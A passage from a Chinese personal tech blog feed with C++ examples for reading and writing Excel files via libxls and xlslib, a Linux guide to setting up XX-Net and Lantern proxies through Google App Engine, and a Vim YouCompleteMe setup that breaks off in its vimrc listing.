cout&lt;&lt;<span class="hljs-string">&quot;当前表名:&quot;</span>&lt;&lt;pwb-&gt;sheets.sheet-&gt;name&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;总表数:&quot;</span>&lt;&lt;pwb-&gt;sheets.count&lt;&lt;endl&lt;&lt;endl;<br>    <span class="hljs-comment">//获取第一张表单 索引从0开始</span><br>    pws= <span class="hljs-built_in">xls_getWorkSheet</span>(pwb,<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//开始解析表单</span><br>    <span class="hljs-built_in">xls_parseWorkSheet</span>(pws);<br>    cout&lt;&lt;<span class="hljs-string">&quot;行数:&quot;</span>&lt;&lt;pws-&gt;rows.lastrow+<span class="hljs-number">1</span>&lt;&lt;endl;<br>    cout&lt;&lt;<span class="hljs-string">&quot;列数:&quot;</span>&lt;&lt;pws-&gt;rows.lastcol&lt;&lt;endl;<br>    <span class="hljs-comment">//遍历</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; pws-&gt;rows.lastrow+<span class="hljs-number">1</span>; ++i) &#123;<br>        <span class="hljs-comment">//xlsRow = st_row::st_row_data</span><br>        <span class="hljs-comment">//获取每一行的数据</span><br>        st_row::st_row_data row= pws-&gt;rows.row[i];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; pws-&gt;rows.lastcol; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(row.cells.cell[j].str) &#123;<br>                cout &lt;&lt; (<span class="hljs-keyword">char</span>*)row.cells.cell[j].str &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span>;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">//关闭</span><br>    <span class="hljs-built_in">xls_close_WS</span>(pws);<br>    <span class="hljs-built_in">xls_close_WB</span>(pwb);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>注意,由于我使用 clion 编写代码,所以在链接库时在 CMakeLists.txt 最后一行添加 <strong>target_link_libraries(libxls_read <a href="http://libxlsreader.so">libxlsreader.so</a>)</strong> 其中 <strong>libxls_read</strong> 为项目名.<br />
或者直接 <code>g++ test.cpp -o libxls_read -lxlsreader</code></p>
<p>测试:<br />
假设有一个Excel文件<br />
<img src="/uploads/images/libxls/file_001.png" alt="img" /></p>
<p>执行程序输出</p>
<blockquote>
<p>version:1.4.0<br />
标题:我是标题<br />
keywords:我是关键字<br />
comment:这是一个测试<br />
subject:我是主题<br />
charset:UTF-8<br />
font name:文泉驿正黑<br />
font bold:400<br />
当前表名:第一张表单<br />
总表数:1</p>
<p>行数:4<br />
列数:5<br />
刘备 关羽 张飞 曹操 刘禅<br />
曹丕 赵云 孙权 黄盖 曹植<br />
貂蝉 张角 孔明 周瑜 小乔<br />
马超</p>
</blockquote>
<h3 id="xlslib写excel"><a class="markdownIt-Anchor" href="#xlslib写excel"></a> xlslib(写Excel</h3>
<h4 id="获取xlslib"><a class="markdownIt-Anchor" href="#获取xlslib"></a> 获取xlslib</h4>
<p>可以从 <a href="http://sourceforge.net/projects/xlslib/">http://sourceforge.net/projects/xlslib/</a> 获取 xlslib并编译安装,同样的默认也是安装到 <strong>/usr/local/include</strong> ,需手动复制到系统目录下</p>
<blockquote>
<p>cp -r /usr/local/include/xlslib /usr/include/</p>
</blockquote>
<h4 id="例子-2"><a class="markdownIt-Anchor" href="#例子-2"></a> 例子</h4>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;xlslib/xlslib.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> xlslib_core;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    workbook wb;<br>    string label;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Version: %s\n&quot;</span>,wb.<span class="hljs-built_in">version</span>());<br>    <span class="hljs-comment">//设置字体</span><br>    <span class="hljs-keyword">font_t</span> *t=wb.<span class="hljs-built_in">font</span>(<span class="hljs-string">&quot;Ubuntu&quot;</span>);<br>    t-&gt;<span class="hljs-built_in">SetColor</span>(CLR_RED);<br>    t-&gt;<span class="hljs-built_in">SetItalic</span>(<span class="hljs-literal">true</span>);<br>    t-&gt;<span class="hljs-built_in">SetHeight</span>(<span class="hljs-number">20</span>*<span class="hljs-number">15</span>);<br>   <span class="hljs-comment">// t-&gt;SetBoldStyle(BOLDNESS_BOLD);</span><br>    <span class="hljs-keyword">xf_t</span> *xf= wb.<span class="hljs-built_in">xformat</span>();<br>    xf-&gt;<span class="hljs-built_in">SetFillBGColor</span>(CLR_GREEN);<br>    xf-&gt;<span class="hljs-built_in">SetFillFGColor</span>(CLR_RED);<br>    xf-&gt;<span class="hljs-built_in">SetFont</span>(t);<br>    <span class="hljs-comment">//第一张表单</span><br>    worksheet *ws=wb.<span class="hljs-built_in">sheet</span>(<span class="hljs-string">&quot;one&quot;</span>);<br>    <span class="hljs-comment">//第二张表单</span><br>    worksheet* ws2=wb.<span class="hljs-built_in">sheet</span>(<span class="hljs-string">&quot;two&quot;</span>);<br>    ws-&gt;<span class="hljs-built_in">MakeActive</span>();<br>    <span class="hljs-comment">//设置列宽度,行高度</span><br>    ws-&gt;<span class="hljs-built_in">defaultColwidth</span>(<span class="hljs-number">15</span>);<br>    ws-&gt;<span class="hljs-built_in">defaultRowHeight</span>(<span class="hljs-number">25</span>);<br>    <span class="hljs-comment">//6行</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-comment">//6列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;<span class="hljs-number">6</span> ; ++j) &#123;<br>            <span class="hljs-keyword">char</span> buf[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">sprintf</span>(buf,<span class="hljs-string">&quot;%d&quot;</span>,i*j);<br>            label=buf;<br>            <span class="hljs-comment">// 写入</span><br>            <span class="hljs-keyword">cell_t</span> * cell= ws-&gt;<span class="hljs-built_in">label</span>(i,j,label,xf);<br>            <span class="hljs-comment">//或者 ws-&gt;number(i,j,i*j,xf);</span><br>            <span class="hljs-comment">//设置字体阴影</span><br>            cell-&gt;<span class="hljs-built_in">fontshadow</span>(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//设置单元格文本对齐</span><br>            cell-&gt;<span class="hljs-built_in">halign</span>(HALIGN_CENTER);<br>            cell-&gt;<span class="hljs-built_in">valign</span>(VALIGN_CENTER);<br>            <span class="hljs-comment">//设置行高度</span><br>            ws-&gt;<span class="hljs-built_in">rowheight</span>(i,<span class="hljs-number">20</span>*<span class="hljs-number">15</span>);<br>        &#125;<br>    &#125;<br>    range *ran=ws-&gt;<span class="hljs-built_in">rangegroup</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>    ran-&gt;<span class="hljs-built_in">cellcolor</span>(CLR_GREEN);<br>    <span class="hljs-comment">//保存到excel文件</span><br>    wb.<span class="hljs-built_in">Dump</span>(<span class="hljs-string">&quot;mynew.xls&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>XX-NET搭建FQ环境</title>
    <url>/linux-xxnet/</url>
    <content><![CDATA[<p>我是在Linux下搭建的,不过其他系统也是一样的.<br />
由于搭建FQ过程比较复杂的,所以这里列举几个工具:<br />
<a href="#googlechrome">下载Google chrome</a><br />
<a href="#lantern">使用lantern蓝灯</a><br />
<a href="#gae">创建GAE并申请appid</a><br />
<a href="#xx_net">XX-NET配置</a></p>
<span id="more"></span>
<p><font color=green>PS： 以下方法可能比较旧，目前我使用的是X-Tunnel</font></p>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<table>
<thead>
<tr>
<th>需要</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Chrome浏览器</td>
<td>–</td>
</tr>
<tr>
<td>lantern</td>
<td>访问Google</td>
</tr>
<tr>
<td>XX-NET</td>
<td>主要工具</td>
</tr>
<tr>
<td>GAE</td>
<td>代理服务器</td>
</tr>
<tr>
<td>SwitchOmega</td>
<td>管理和切换多个代理设置</td>
</tr>
</tbody>
</table>
<h4 id="下载google-chrome"><a class="markdownIt-Anchor" href="#下载google-chrome"></a> 下载Google chrome</h4>
<p>建议去官网下载,所以这里就要用到lantern了<br />
<img src="/uploads/images/vpn/file_003.png" alt="img" /><br />
安装略 😃</p>
<h4 id="使用lantern蓝灯"><a class="markdownIt-Anchor" href="#使用lantern蓝灯"></a> 使用lantern蓝灯</h4>
<p>使用lantern蓝灯</p>
<p>到github获取 <a href="https://github.com/getlantern/forum">https://github.com/getlantern/forum</a></p>
<p><img src="/uploads/images/vpn/file_001.png" alt="img" /><br />
我的是Linux系统<br />
<img src="/uploads/images/vpn/file_002.png" alt="img" /><br />
下载之后就可以 <code>dpkg -i</code>来安装了,然后可以直接 lantern 运行,并显示一个托盘图标.<br />
可以 <code>netstat -ntlp |grep lantern</code> 来查看lantern进场监听的端口.</p>
<blockquote>
<p>别说这访问速度还挺快的.不过,体验版lantern用户每个月只能用几百MB的流量,超过后就不能用了(省点用啊),所以,特么的看个视频就没了…基于此,我决定折腾一番…</p>
</blockquote>
<h4 id="创建gae并申请appid"><a class="markdownIt-Anchor" href="#创建gae并申请appid"></a> 创建GAE并申请appid</h4>
<p>其实,到了这里就是注意了,这才是最主要的.<br />
GAE(Google APP Engine)是什么?<br />
以下摘自百度</p>
<blockquote>
<p>Google App Engine 是一种让您可以在 Google 的基础架构上运行您的网络应用程序。Google App Engine 应用程序易于构建和维护，并可根据您的访问量和数据存储需要的增长轻松扩展。使用 Google App Engine，将不再需要维护服务器：您只需上传您的应用程序，它便可立即为您的用户提供服务。</p>
</blockquote>
<p><strong>PS:必须去创建一个Google账号,此处不在赘述</strong><br />
gae官网: <a href="https://appengine.google.com">https://appengine.google.com</a><br />
输入Google账号密码之后就可以进去gae管理界面了<br />
<img src="/uploads/images/vpn/file_004.png" alt="img" /></p>
<p>之后可以直接创建项目了,注意那个<code>appid</code>就是<strong>项目名</strong><br />
<img src="/uploads/images/vpn/file_005.png" alt="img" /></p>
<p>等待创建完成<br />
<img src="/uploads/images/vpn/file_006.png" alt="img" /></p>
<p>完成之后只需吧那个<code>appid</code>记住.<br />
<img src="/uploads/images/vpn/file_007.png" alt="img" /></p>
<p><strong>PS:可以创建多个项目.在配置xx-net时也可以指定多个appid,一个appid对应1G的使用流量</strong></p>
<h4 id="xx-net配置"><a class="markdownIt-Anchor" href="#xx-net配置"></a> XX-NET配置</h4>
<p>可以在 <a href="https://github.com/XX-net/XX-Net">https://github.com/XX-net/XX-Net</a> 下载 <strong>XX-NET</strong><br />
直接 <code>git clone https://github.com/XX-net/XX-Net.git</code><br />
<img src="/uploads/images/vpn/file_008.png" alt="img" /></p>
<p>或者在这里下载: <a href="https://github.com/XX-net/XX-Net/blob/master/code/default/download.md">https://github.com/XX-net/XX-Net/blob/master/code/default/download.md</a><br />
<img src="/uploads/images/vpn/file_009.png" alt="img" /><br />
中文帮助文档: <a href="https://github.com/XX-net/XX-Net/wiki/%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3">https://github.com/XX-net/XX-Net/wiki/%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3</a></p>
<p>下载之后</p>
<figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">unzip XX-<span class="hljs-built_in">Net</span>-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>.zip<br><span class="hljs-built_in">cd</span> XX-<span class="hljs-built_in">Net</span>-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span><br>./<span class="hljs-built_in">start</span> #后台运行<br></code></pre></div></td></tr></table></figure>
<p><strong>PS:建议在配置XX-NET之前,后台运行lantern,因为等下部署时要登录Google账号</strong></p>
<p>我在Linux下配置时还要开启<strong>ipv6</strong>通道 .方法如下</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-get install miredo<br><span class="hljs-attribute">miredo</span> #运行<br><span class="hljs-attribute">ifconfig</span>可以看到多出一个`teredo`接口<br><br><span class="hljs-attribute">teredo</span>: flags=<span class="hljs-number">4305</span> mtu <span class="hljs-number">1280</span><br><span class="hljs-attribute">inet6</span> <span class="hljs-number">2001</span>:<span class="hljs-number">0</span>:<span class="hljs-number">53</span>aa:<span class="hljs-number">64</span>c:<span class="hljs-number">2</span>c<span class="hljs-number">46</span>:bf<span class="hljs-number">0</span>:e<span class="hljs-number">4</span>db:<span class="hljs-number">1</span>ac<span class="hljs-number">5</span> prefixlen <span class="hljs-number">32</span> scopeid <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">inet6</span> fe<span class="hljs-number">80</span>::<span class="hljs-number">707</span>:<span class="hljs-number">2</span>c<span class="hljs-number">4</span>a:<span class="hljs-number">7</span>df<span class="hljs-number">6</span>:<span class="hljs-number">4104</span> prefixlen <span class="hljs-number">64</span> scopeid <span class="hljs-number">0</span>x<span class="hljs-number">20</span><br><span class="hljs-attribute">inet6</span> fe<span class="hljs-number">80</span>::ffff:ffff:ffff prefixlen <span class="hljs-number">64</span> scopeid <span class="hljs-number">0</span>x<span class="hljs-number">20</span><br><span class="hljs-attribute">unspec</span> <span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span>-<span class="hljs-number">00</span> txqueuelen <span class="hljs-number">500</span> (UNSPEC)<br><span class="hljs-attribute">RX</span> packets <span class="hljs-number">2828</span> bytes <span class="hljs-number">1820077</span> (<span class="hljs-number">1</span>.<span class="hljs-number">7</span> MiB)<br><span class="hljs-attribute">RX</span> errors <span class="hljs-number">0</span> dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span> frame <span class="hljs-number">0</span><br><span class="hljs-attribute">TX</span> packets <span class="hljs-number">3687</span> bytes <span class="hljs-number">397036</span> (<span class="hljs-number">387</span>.<span class="hljs-number">7</span> KiB)<br><span class="hljs-attribute">TX</span> errors <span class="hljs-number">0</span> dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span> carrier <span class="hljs-number">0</span> collisions <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure>
<p>XX-NET主界面<br />
<img src="/uploads/images/vpn/file_010.png" alt="img" /></p>
<p>部署服务端–&gt;配置–&gt;查看状态</p>
<ul>
<li>部署服务端<br />
多个appid用 “|” 分割,之后可以[开始部署],再次强调一下,那个<code>appid</code>就是<strong>项目名</strong><br />
<img src="/uploads/images/vpn/file_011.png" alt="img" /></li>
</ul>
<p>之后会跳转到登录Google账号的窗口.登录ok后<strong>等待部署完成</strong></p>
<ul>
<li>配置<br />
之后在<code>GAE AppID</code>输入自己的appid<br />
<img src="/uploads/images/vpn/file_012.png" alt="img" /></li>
<li>状态<br />
确保每次配置时查看是否配置成功!<br />
<img src="/uploads/images/vpn/file_013.png" alt="img" /><br />
如果出现 <code>请检查浏览器代理设置。</code>表示配置成功了,只是还需要 <strong>“设置代理，是为了让你的浏览器或者其他应用程序知道XX-Net的存在，这样他们才会通过XX-Net科学上网。”</strong></li>
<li>解决方法<br />
具体方法可以查看 <a href="https://github.com/XX-net/XX-Net/wiki/%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86">https://github.com/XX-net/XX-Net/wiki/%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86</a></li>
</ul>
<p>由于我目前是Linux系统,所以 我用 <strong>Chrome+SwitchOmega(管理和切换多个代理设置)</strong></p>
<p>可以在chrome浏览器应用商店安装SwitchOmega拓展程序<br />
<img src="/uploads/images/vpn/file_014.png" alt="img" /></p>
<p>然后打开<strong>SwitchOmega选项</strong>–&gt;导入/导出–&gt;从备份文件恢复<br />
导入<strong>OmegaOptions.bak</strong>文件,此文件位置在 …/XX-Net-3.8.0/SwitchyOmega/ 目录下<br />
<img src="/uploads/images/vpn/file_015.png" alt="img" /></p>
<p>之后可以看到一下几个选项<br />
<img src="/uploads/images/vpn/file_016.png" alt="img" /></p>
<p>然后选择gae服务器代理.恢复正常可以切换回 <strong>[系统代理]</strong><br />
<img src="/uploads/images/vpn/file_017.png" alt="img" /></p>
<p>然后再看看XX-NET配置状态,成功!<br />
<img src="/uploads/images/vpn/file_018.png" alt="img" /><br />
现在可以关闭lantern了,然后再去试试看能不能打开 <a href="https://www.google.com">https://www.google.com</a> 吧!<br />
<img src="/uploads/images/vpn/file_019.png" alt="img" /><br />
<img src="/uploads/images/vpn/file_020.png" alt="img" /></p>
<p>去浪吧~ :&gt;</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Vim YCM配置</title>
    <url>/linux-ycm-vim/</url>
    <content><![CDATA[<p>由于之前不小心把vim的配置删了，致使之前的那篇文章无法访问，但为了回应有关网友的回复，特此重新编辑了vim的ycm配置。😃</p>
<p>YCM全称 YouCompleteMe，是一个vim插件，但是却是一个能够使代码自动补全的工具。虽然如此，但也还是无法与专用IDE相媲美，不过对于vim党来说却是一个十分有趣的插件。</p>
<span id="more"></span>
<h2 id="安装前"><a class="markdownIt-Anchor" href="#安装前"></a> 安装前</h2>
<p>要使VIM配置YCM，则必须确保Vim支持Python2和Python3，可以用 <code>vim --version</code> 查看是否支持。否则请自行从源代码安装vim。</p>
<p>我的系统是archlinux，vim版本为8.2</p>
<h2 id="安装ycmvundle"><a class="markdownIt-Anchor" href="#安装ycmvundle"></a> 安装YCM(Vundle)</h2>
<p>YCM github： <a href="https://github.com/ycm-core/YouCompleteMe">https://github.com/ycm-core/YouCompleteMe</a></p>
<p>推荐通过 <strong>Vundle</strong> 安装 YCM，在此之前，需要安装 Vundle： <a href="https://github.com/VundleVim/Vundle.vim">https://github.com/VundleVim/Vundle.vim</a></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim<br></code></pre></div></td></tr></table></figure>
<p>之后可以编辑 ~/.vimrc 文件</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> nocompatible<br>filetype off <br><br><span class="hljs-built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim<br>call vundle<span class="hljs-comment">#begin()</span><br>...<br>Plugin <span class="hljs-string">&#x27;VundleVim/Vundle.vim&#x27;</span><br>...<br>call vundle<span class="hljs-comment">#end()</span><br>filetype plugin indent on<br></code></pre></div></td></tr></table></figure>
<p>一般来说，vundle常用用法如下</p>
<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-symbol">:PluginList</span>       - 列举配置插件<br><span class="hljs-symbol">:PluginInstall</span>    - 安装 ‘Plugin’ 之后的插件<br><span class="hljs-symbol">:PluginUpdate</span>	  - 更新插件<br><span class="hljs-symbol">:PluginSearch</span> foo - 寻找插件 foo并添加的本地配置<br><span class="hljs-symbol">:PluginClean</span>      - 删除未被使用的插件<br></code></pre></div></td></tr></table></figure>
<h2 id="支持cc"><a class="markdownIt-Anchor" href="#支持cc"></a> 支持C/C++</h2>
<p>要使YCM支持C语言的自动补全，还需要配置YCM，首先在 .vimrc 添加一行</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">call vundle<span class="hljs-comment">#begin()</span><br>. . . <br>Plugin <span class="hljs-string">&#x27;Valloric/YouCompleteMe’</span><br><span class="hljs-string">. . .</span><br><span class="hljs-string">call vundle#end()</span><br></code></pre></div></td></tr></table></figure>
<p>进入vim后 <code>:PluginInstall</code> ，然后在进行编译YCM，当然还有 ./install.sh --all ，不过我就不怎么配置了。 注意还要安装 <code>cmake</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/.vim/bundle/YouCompleteMe<br>./install.sh --clang-completer<br></code></pre></div></td></tr></table></figure>
<p>如果是Git YCM的，那么还需要在该目录下执行</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/ycm-core/YouCompleteMe.git<br>git submodule update --init --recursive<br></code></pre></div></td></tr></table></figure>
<h2 id="下载安装libclang"><a class="markdownIt-Anchor" href="#下载安装libclang"></a> 下载安装libclang</h2>
<p>由于我的系统是archlinux，所以可以直接</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo pacman -S clang boost llvm-libs<br></code></pre></div></td></tr></table></figure>
<p>其他linux系统比如Ubuntu，需要安装 llvm，clang，libclang，libboost。</p>
<h2 id="编译构建-ycm_core-库"><a class="markdownIt-Anchor" href="#编译构建-ycm_core-库"></a> 编译构建 ycm_core 库</h2>
<p>编译构建ycm_core库需要安装 cmake和python3-dev<br />
创建一个用于存放编译过程的产生的文件</p>
<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># mkdir ~/ycm_build</span><br><span class="hljs-comment"># cd ~/ycm_build</span><br><span class="hljs-comment"># cmake -G &quot;Unix Makefiles&quot; -DUSE_SYSTEM_BOOST=ON -DUSE_SYSTEM_LIBCLANG=ON . ~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp</span><br><br>输出：<br>-- The C compiler identification is GNU 9.1.0<br>-- The CXX compiler identification is GNU 9.1.0<br>-- Check <span class="hljs-keyword">for</span> working C compiler: /usr/bin/cc<br>-- Check <span class="hljs-keyword">for</span> working C compiler: /usr/bin/cc -- works<br>-- Detecting C compiler ABI info<br>-- Detecting C compiler ABI info - <span class="hljs-keyword">done</span><br>-- Detecting C compile features<br>-- Detecting C compile features - <span class="hljs-keyword">done</span><br>-- Check <span class="hljs-keyword">for</span> working CXX compiler: /usr/bin/c++<br>-- Check <span class="hljs-keyword">for</span> working CXX compiler: /usr/bin/c++ -- works<br>-- Detecting CXX compiler ABI info<br>-- Detecting CXX compiler ABI info - <span class="hljs-keyword">done</span><br>-- Detecting CXX compile features<br>-- Detecting CXX compile features - <span class="hljs-keyword">done</span><br>-- Found PythonLibs: /usr/lib/libpython2.7.so (found suitable version <span class="hljs-string">&quot;2.7.16&quot;</span>, minimum required is <span class="hljs-string">&quot;2.7&quot;</span>) <br>-- Using libclang to provide semantic completion <span class="hljs-keyword">for</span> C/C++/ObjC<br>-- Found Boost: /usr/include (found version <span class="hljs-string">&quot;1.69.0&quot;</span>) found components:  filesystem regex <br>-- Using external libclang: /usr/lib/libclang.so.8<br>-- NOT using clang-tidy <span class="hljs-keyword">for</span> static analysis.<br>-- Configuring <span class="hljs-keyword">done</span><br>-- Generating <span class="hljs-keyword">done</span><br>-- Build files have been written to: /home/joxrays/ycm_build<br><br><span class="hljs-comment"># cmake --build . --target ycm_core --config Release</span><br>	--config Release 针对 Windows，对于Linux/Unix忽略<br>若无错误之后可看到 `Linking CXX shared library /home/joxrays/.vim/bundle/YouCompleteMe/third_party/ycmd/ycm_core.so`<br></code></pre></div></td></tr></table></figure>
<p>至此YCM_CORE编译完成，接下来就可以</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cp ~/.vim/bundle/YouCompleteMe/third_party/ycmd/examples/.ycm_extra_conf.py ~/.vim/<br></code></pre></div></td></tr></table></figure>
<h2 id="vim配置文件插件"><a class="markdownIt-Anchor" href="#vim配置文件插件"></a> vim配置文件+插件</h2>
<p>我先把我的vimrc配置文件贴出了</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 